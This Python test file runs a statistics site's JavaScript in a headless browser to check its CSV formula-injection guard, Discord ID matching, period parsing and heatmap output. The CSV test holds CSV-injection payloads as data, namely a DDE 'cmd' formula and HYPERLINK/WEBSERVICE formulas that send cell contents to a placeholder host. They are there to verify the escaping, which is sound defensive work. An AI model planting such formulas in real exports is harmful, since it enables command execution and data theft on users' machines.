"""The statistics pages' own JavaScript, run in a headless browser: the CSV file's guard against formulas, the table search on Discord IDs,
and how a period reads. The static files are served as the site serves them and a page imports the real modules. Skipped where no
Chromium-based browser is installed."""
from __future__ import annotations

import asyncio
import json
import os
import re
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

from aiohttp import web

STATIC = Path(__file__).resolve().parent.parent / "captainguild" / "web" / "static"
BROWSERS = [r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Google\Chrome\Application\chrome.exe"]


def _browser() -> str | None:
    for name in ("chromium", "chromium-browser", "google-chrome", "microsoft-edge", "msedge"):
        found = shutil.which(name)
        if found:
            return found
    return next((path for path in BROWSERS if os.path.exists(path)), None)


HARNESS = """<!doctype html><meta charset="utf-8"><pre id="out">running</pre>
<script type="module">
const out = {};
try {
  const { toCsv } = await import('/static/js/charts.js');
  const { meets } = await import('/static/js/stats/table.js');
  const common = await import('/static/js/stats/common.js');
  const cells = %(cells)s;
  out.csv = toCsv(['cell'], cells.map((cell) => [cell])).split('\\r\\n').slice(1, -1);
  const column = { key: 'id' };
  out.meets = %(conditions)s.map(([op, value, id]) => meets({ op, value }, column, { id }));
  out.periods = %(periods)s.map((value) => [common.periodText(value, { mode: 'days', days: 30 }), common.readablePeriod(value)]);
} catch (error) { out.error = String((error && error.stack) || error); }
document.getElementById('out').textContent = JSON.stringify(out);
</script>"""


HEATMAP = """<!doctype html><meta charset="utf-8"><link rel="stylesheet" href="/static/css/app.css">
<div class="viz" id="chart" style="width: 900px"></div><pre id="out">running</pre>
<script type="module">
const out = {};
try {
  const { html, render } = await import('/static/js/lib.js');
  const { Heatmap, pictureOf } = await import('/static/js/charts.js');
  const cells = Array.from({ length: 7 }, (_, day) => Array.from({ length: 24 }, (_, hour) => day * 24 + hour));
  const box = document.getElementById('chart');
  render(html`<${Heatmap} cells=${cells} format=${(value) => String(Math.round(value))} />`, box);
  await new Promise((done) => setTimeout(done, 300));
  const picture = pictureOf(box, 'Messages by hour', 'Last 30 days');
  out.svg = picture ? picture.svg : null;
} catch (error) { out.error = String((error && error.stack) || error); }
document.getElementById('out').textContent = JSON.stringify(out);
</script>"""


@unittest.skipUnless(_browser(), "needs a Chromium-based browser")
class PageScripts(unittest.IsolatedAsyncioTestCase):
    async def run_page(self, cells: list, conditions: list, periods: list, page: str | None = None) -> dict:
        page = page or HARNESS % {"cells": json.dumps(cells), "conditions": json.dumps(conditions), "periods": json.dumps(periods)}
        app = web.Application()
        app.router.add_get("/harness", lambda request: web.Response(text=page, content_type="text/html"))
        app.router.add_static("/static/", STATIC)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, "127.0.0.1", 0)
        await site.start()
        port = site._server.sockets[0].getsockname()[1]
        profile = tempfile.mkdtemp(prefix="cg-browser-")
        try:
            # Ubuntu's AppArmor rules keep Chrome's sandbox from starting on CI runners, and the page is this test's own harness.
            sandbox = ["--no-sandbox"] if sys.platform.startswith("linux") else []
            process = await asyncio.create_subprocess_exec(_browser(), "--headless=new", "--disable-gpu", "--no-first-run", *sandbox, f"--user-data-dir={profile}",
                                                           "--virtual-time-budget=10000", "--dump-dom", f"http://127.0.0.1:{port}/harness",
                                                           stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            dom, errors = await asyncio.wait_for(process.communicate(), 90)
        finally:
            await runner.cleanup()
            shutil.rmtree(profile, ignore_errors=True)
        found = re.search(r'<pre id="out">(.*?)</pre>', dom.decode("utf-8", "replace"), re.S)
        self.assertIsNotNone(found, (dom[-500:], errors.decode("utf-8", "replace")[-1500:]))
        import html
        result = json.loads(html.unescape(found.group(1)))
        self.assertNotIn("error", result, result.get("error"))
        return result

    async def test_a_cell_that_would_start_a_formula_gets_an_apostrophe(self):
        cells = ["-1+cmd|' /C calc'!A0", '-2+3+HYPERLINK("http://x.example/?"&A1,"x")', '-1+WEBSERVICE("//x.example/"&C2)', "=1+1", "+1+1", "@SUM(1)",
                 "\tx", "\rx", "-x+1", "-5", -5, -12.5, 42, "Plain name"]
        found = await self.run_page(cells, [], [])
        self.assertEqual(found["csv"], ["'-1+cmd|' /C calc'!A0", '"\'-2+3+HYPERLINK(""http://x.example/?""&A1,""x"")"', '"\'-1+WEBSERVICE(""//x.example/""&C2)"',
                                        "'=1+1", "'+1+1", "'@SUM(1)", "'\tx", "\"'\rx\"", "'-x+1", "'-5", "-5", "-12.5", "42", "Plain name"])

    async def test_equals_tells_two_discord_ids_apart(self):
        conditions = [["eq", "1234567890123456789", "1234567890123456700"], ["eq", "1234567890123456789", "1234567890123456789"],
                      ["ne", "1234567890123456789", "1234567890123456700"], ["eq", "5", 5], ["eq", "1,000", 1000], ["lt", "10", 9]]
        found = await self.run_page([], conditions, [])
        self.assertEqual(found["meets"], [False, True, True, True, True, True])

    async def test_a_period_the_server_refuses_reads_as_the_servers_own(self):
        periods = ["2000mo", "99999w", "1200mo", "5214w", "876000h", "36500d", "36501d", "since:2025-02-30", "since:2025-03-01", "all", ""]
        found = await self.run_page([], [], periods)
        default = "Server default (last 30 days)"
        self.assertEqual(found["periods"], [[default, False], [default, False], ["Last 1200 months", True], ["Last 5214 weeks", True], ["Last 876000 hours", True],
                                            ["Last 36500 days", True], [default, False], [default, False], ["Since Mar 1, 2025", True], ["All time", True],
                                            [default, True]])


    async def test_a_heatmap_picture_carries_its_color_scale(self):
        found = await self.run_page([], [], [], HEATMAP)
        svg = found["svg"] or ""
        steps = re.findall(r'<rect[^>]*class="viz-scale-step"[^>]*fill="([^"]+)"', svg)
        self.assertEqual(len(steps), 7, svg[-800:])
        self.assertEqual(len(set(steps)), 7, "seven different colors")
        self.assertIn(">0<", svg)
        self.assertIn(">167<", svg, "the largest value reads at the scale's end")

if __name__ == "__main__":
    unittest.main()
